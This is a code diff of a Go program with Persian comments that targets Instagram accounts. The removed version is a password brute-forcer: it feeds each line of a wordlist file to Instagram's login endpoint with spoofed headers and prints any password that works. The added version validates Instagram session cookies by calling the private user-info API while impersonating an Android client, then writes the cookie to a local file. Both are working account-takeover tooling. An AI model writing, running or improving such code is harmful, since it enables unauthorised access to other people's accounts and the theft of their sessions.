@@ -1,183 +1,180 @@
 package main
 
 import (
-	"bufio"
+	"context"
+	"encoding/json"
 	"fmt"
-	"io"
+	"io/ioutil"
+	"math/rand"
 	"net/http"
-	"net/url"
 	"os"
+	"regexp"
 	"strings"
 	"time"
 )
 
-// --- Configuration Section ---
-const (
-	// Login URL (the same AJAX endpoint you were using before)
-	loginURL = "https://www.instagram.com/accounts/login/ajax/"
+// InstaConfig مدل اطلاعات کمکی
+type InstaConfig struct{}
 
-	// Form field names
-	usernameField    = "username"
-	passwordField    = "enc_password" // Note: The encryption prefix is still hardcoded in the tryPassword function
-	optIntoOneTap    = "optIntoOneTap"
-	queryParams      = "queryParams"
-	trustedDeviceRec = "trustedDeviceRecords"
-	loginAttemptCount = "loginAttemptCount"
-	isPrivacyPortalReq = "isPrivacyPortalReq"
+// idbear کوکی رو آنالیز می‌کنه و uid و bearer برمی‌گردونه
+func (i *InstaConfig) idbear(cookie string) (string, string, error) {
+	// فرض کن mid و bearer رو از کوکی استخراج کنیم (مثال ساده)
+	reUID := regexp.MustCompile(`ds_user_id=(\d+);`)
+	reBearer := regexp.MustCompile(`sessionid=(\w+);`)
 
-	// File containing passwords
-	passwordsFile = "password.txt"
+	uidMatch := reUID.FindStringSubmatch(cookie)
+	bearerMatch := reBearer.FindStringSubmatch(cookie)
 
-	// Delay between attempts (in seconds)
-	retryDelaySeconds = 2
-)
+	if len(uidMatch) < 2 || len(bearerMatch) < 2 {
+		return "", "", fmt.Errorf("invalid cookie format")
+	}
 
-// HTTP Headers (some values are examples or may need dynamic generation)
-// Important Note: Hardcoded tokens like CSRFToken and cookies will likely cause issues
-// as they are session-specific and expire. This is a major limitation.
-var defaultHeaders = map[string]string{
-	"User-Agent":       "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)",
-	"X-CSRFToken":      "z2y86ITZAahahOfRghvrCF3PlUj4wx8N", // Example: This should be dynamic
-	"X-Instagram-AJAX": "1023134472",                     // Example: This might change
-	"X-Requested-With": "XMLHttpRequest",
-	"Referer":          "https://www.instagram.com/accounts/login/",
-	"Origin":           "https://www.instagram.com",
-	"Content-Type":     "application/x-www-form-urlencoded",
-	"X-IG-App-ID":      "936619743392459",                    // Example: This might change
-	"X-IG-WWW-Claim":   "hmac.AR0yguz-o9CzH6COPm6FWASXsTwt-9uGK8POXdrEwr7UYcqC", // Example: This should be dynamic
-	"Cookie":           `csrftoken=z2y86ITZAahahOfRghvrCF3PlUj4wx8N; mid=aDCkugALAAE0mwBUT4-2EUrl5ufw; ig_did=1E68718D-4352-40B7-AEFF-BBEDAD4A4091; rur="VLL,50771762250,1779555557:01f7212..."`, // Example: These are session-specific
+	return uidMatch[1], bearerMatch[1], nil
 }
 
-// Debug Mode
-// If true, more detailed logs will be displayed. Set to false for less output.
-var debugMode = true
-// --- End of Configuration Section ---
+func (i *InstaConfig) pigeon() string {
+	return fmt.Sprintf("sess-%d", rand.Intn(1000000))
+}
 
-func tryPassword(username, password string) bool {
-	data := url.Values{}
-	// Note: The #PWD_INSTAGRAM_BROWSER:10:<timestamp>:<password> encryption format
-	// is specific, and the timestamp here is static. This is a significant limitation.
-	data.Set(passwordField, "#PWD_INSTAGRAM_BROWSER:10:1748019955:"+password)
-	data.Set(usernameField, username)
-	data.Set(optIntoOneTap, "false")
-	data.Set(queryParams, "{}")
-	data.Set(trustedDeviceRec, "{}")
-	data.Set(loginAttemptCount, "0")
-    data.Set(isPrivacyPortalReq, "false")
+func (i *InstaConfig) clintime() string {
+	return fmt.Sprintf("%d", time.Now().Unix())
+}
 
-	client := &http.Client{
-		Timeout: 30 * time.Second, // A timeout was added for the client
+func (i *InstaConfig) deviceid() string {
+	return "android-1234567890"
+}
+
+func (i *InstaConfig) family() string {
+	return "family-1234567890"
+}
+
+func (i *InstaConfig) androidid() string {
+	return "android-0987654321"
+}
+
+// مدل پاسخ JSON
+type UserInfo struct {
+	User struct {
+		FullName string `json:"full_name"`
+	} `json:"user"`
+}
+
+func checkCookie(cookie string) (bool, string, error) {
+	// استخراج mid از کوکی
+	mid := ""
+	midRegex := regexp.MustCompile(`mid=(.*?);`)
+	if strings.Contains(cookie, "mid=") {
+		match := midRegex.FindStringSubmatch(cookie)
+		if len(match) > 1 {
+			mid = match[1]
+		}
 	}
-	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
+
+	insta := &InstaConfig{}
+
+	uid, bearer, err := insta.idbear(cookie)
 	if err != nil {
-		if debugMode {
-			fmt.Println("Error creating request:", err)
-		}
-		return false
+		return false, "", fmt.Errorf("idbear error: %v", err)
 	}
 
-	// Set headers from the configuration
-	for key, value := range defaultHeaders {
-		req.Header.Set(key, value)
+	client := &http.Client{}
+
+	// ساخت ریکوئست با Context برای Timeout
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
+	defer cancel()
+
+	req, err := http.NewRequestWithContext(ctx, "GET", fmt.Sprintf("https://i.instagram.com/api/v1/users/%s/info/", uid), nil)
+	if err != nil {
+		return false, "", fmt.Errorf("request creation error: %v", err)
 	}
 
-	if debugMode {
-		fmt.Println("\n--- Attempting password:", password, "---")
-		fmt.Println("Sending request to:", loginURL)
-		// fmt.Println("With form data:", data.Encode()) // Displaying form data might be verbose
-		fmt.Println("With headers:")
-		for key, values := range req.Header {
-			fmt.Printf("  %s: %s\n", key, strings.Join(values, ", "))
-		}
-	}
+	// هدرهای لازم
+	req.Header.Set("x-ig-app-locale", "in_ID")
+	req.Header.Set("x-ig-device-locale", "in_ID")
+	req.Header.Set("x-ig-mapped-locale", "id_ID")
+	req.Header.Set("x-pigeon-session-id", insta.pigeon())
+	req.Header.Set("x-pigeon-rawclienttime", insta.clintime())
+	req.Header.Set("x-ig-bandwidth-speed-kbps", fmt.Sprintf("%.3f", rand.Float64()*(10000-1000)+1000))
+	req.Header.Set("x-ig-bandwidth-totalbytes-b", fmt.Sprintf("%d", rand.Intn(10000000-1000000)+1000000))
+	req.Header.Set("x-ig-bandwidth-totaltime-ms", fmt.Sprintf("%d", rand.Intn(10000-1000)+1000))
+	req.Header.Set("x-bloks-version-id", "ee55d61628b17424a72248a17431be7303200a6e7fa08b0de1736f393f1017bd")
+	req.Header.Set("x-ig-www-claim", "0")
+	req.Header.Set("x-debug-www-claim-source", "handleLogin3")
+	req.Header.Set("x-bloks-prism-button-version", "CONTROL")
+	req.Header.Set("x-bloks-prism-colors-enabled", "false")
+	req.Header.Set("x-bloks-prism-ax-base-colors-enabled", "false")
+	req.Header.Set("x-bloks-prism-font-enabled", "false")
+	req.Header.Set("x-bloks-is-layout-rtl", "false")
+	req.Header.Set("x-ig-device-id", insta.deviceid())
+	req.Header.Set("x-ig-family-device-id", insta.family())
+	req.Header.Set("x-ig-android-id", insta.androidid())
+	req.Header.Set("x-ig-timezone-offset", fmt.Sprintf("%d", -int(time.Now().UTC().Unix())))
+	req.Header.Set("x-ig-nav-chain", fmt.Sprintf("MainFeedFragment:feed_timeline:1:cold_start:%d.853::,com.bloks.www.bloks.ig.ndx.ci.entry.screen:com.bloks.www.bloks.ig.ndx.ci.entry.screen:2:button:%d.356::", time.Now().Unix(), time.Now().Unix()))
+	req.Header.Set("x-fb-connection-type", "WIFI")
+	req.Header.Set("x-ig-connection-type", "WIFI")
+	req.Header.Set("x-ig-capabilities", "3brTv10=")
+	req.Header.Set("x-ig-app-id", "567067343352427")
+	req.Header.Set("priority", "u=3")
+	req.Header.Set("user-agent", "Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)")
+	req.Header.Set("accept-language", "id-ID, en-US")
+	req.Header.Set("authorization", "Bearer IGT:2:"+bearer)
+	req.Header.Set("x-mid", mid)
+	req.Header.Set("ig-u-ds-user-id", uid)
+	req.Header.Set("ig-intended-user-id", uid)
+	req.Header.Set("x-fb-http-engine", "Liger")
+	req.Header.Set("x-fb-client-ip", "True")
+	req.Header.Set("x-fb-server-cluster", "True")
+	req.Header.Set("Cookie", cookie)
 
 	resp, err := client.Do(req)
 	if err != nil {
-		if debugMode {
-			fmt.Println("Error sending request:", err)
-		}
-		return false
+		return false, "", fmt.Errorf("request error: %v", err)
 	}
 	defer resp.Body.Close()
 
-	bodyBytes, err := io.ReadAll(resp.Body)
+	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		if debugMode {
-			fmt.Println("Error reading response:", err)
-		}
-		return false
-	}
-	body := string(bodyBytes)
-
-	if debugMode {
-		fmt.Println("Response status:", resp.StatusCode)
-		fmt.Println("Response body:", body)
+		return false, "", fmt.Errorf("read body error: %v", err)
 	}
 
-	// Your original success condition
-	if resp.StatusCode == 200 && strings.Contains(body, `"authenticated":true`) {
-		return true
+	var userInfo UserInfo
+	err = json.Unmarshal(body, &userInfo)
+	if err != nil {
+		return false, "", fmt.Errorf("json unmarshal error: %v", err)
 	}
 
-	// Additional check for security challenge for more clarity in debug mode
-	if strings.Contains(body, `"challenge_required"`) || resp.StatusCode == 400 {
-		if debugMode {
-			fmt.Println("!!! Warning: Security challenge detected by Instagram or bad request (Code: ", resp.StatusCode, ") !!!")
-		}
-	}
-    if resp.StatusCode == 404 {
-        if debugMode {
-            fmt.Println("!!! Warning: Target URL (", loginURL, ") not found (404) !!!")
-        }
-    }
+	fullName := userInfo.User.FullName
 
-	return false
+	// ساخت پوشه data در صورت نبودن
+	if _, err := os.Stat("data"); os.IsNotExist(err) {
+		os.Mkdir("data", 0755)
+	}
+
+	// ذخیره کوکی در فایل
+	err = ioutil.WriteFile("data/login.txt", []byte(cookie), 0644)
+	if err != nil {
+		return false, "", fmt.Errorf("write file error: %v", err)
+	}
+
+	if fullName != "" {
+		return true, fullName, nil
+	}
+
+	return false, "", nil
 }
 
 func main() {
-	fmt.Print("Enter username: ")
-	var username string
-	fmt.Scanln(&username)
+	// مقدار کوکی واقعی رو اینجا بذار
+	cookie := "ds_user_id=123456; sessionid=abcdef1234567890; mid=XYZ123;"
 
-	file, err := os.Open(passwordsFile)
+	ok, name, err := checkCookie(cookie)
 	if err != nil {
-		fmt.Println("Error opening passwords file (", passwordsFile, "):", err)
+		fmt.Println("Error:", err)
 		return
 	}
-	defer file.Close()
-
-	if debugMode {
-		fmt.Println("Starting to read passwords from file:", passwordsFile)
+	if ok {
+		fmt.Println("Login successful! User full name:", name)
+	} else {
+		fmt.Println("Login failed!")
 	}
-
-	scanner := bufio.NewScanner(file)
-	passwordFound := false
-	for scanner.Scan() {
-		password := scanner.Text()
-		if password == "" { // Skip empty lines
-			continue
-		}
-
-		fmt.Println("\nAttempting password:", password) // This main message remains
-
-		if tryPassword(username, password) {
-			fmt.Println("\n******************************")
-			fmt.Println("      Password found:", password)
-			fmt.Println("******************************")
-			passwordFound = true
-			break
-		}
-		if debugMode {
-			fmt.Println("--- End of attempt for password:", password, "---")
-		}
-		time.Sleep(retryDelaySeconds * time.Second)
-	}
-
-	if err := scanner.Err(); err != nil {
-		fmt.Println("Error reading passwords file:", err)
-	}
-
-	if !passwordFound {
-        fmt.Println("\nFinished processing passwords file. No password was found.")
-    }
 }
